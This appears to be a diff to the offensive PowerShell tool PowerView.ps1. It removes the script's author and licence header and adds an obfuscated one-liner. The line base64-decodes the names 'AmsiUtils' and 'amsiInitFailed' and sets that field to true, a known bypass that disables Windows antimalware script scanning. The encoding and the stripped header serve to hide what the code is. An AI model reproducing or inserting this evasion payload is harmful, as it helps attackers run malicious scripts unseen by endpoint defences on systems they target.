@@ -1,22 +1,4 @@
-#requires -version 2
-
-<#
-
-PowerSploit File: PowerView.ps1
-Author: Will Schroeder (@harmj0y)
-License: BSD 3-Clause
-Required Dependencies: None
-
-#>
-
-
-########################################################
-#
-# PSReflect code for Windows API access
-# Author: @mattifestation
-#   https://raw.githubusercontent.com/mattifestation/PSReflect/master/PSReflect.psm1
-#
-########################################################
+[Ref].Assembly.GetType($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzAA==')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwA=')))).SetValue($null,$true)
 
 function New-InMemoryModule {
 <#
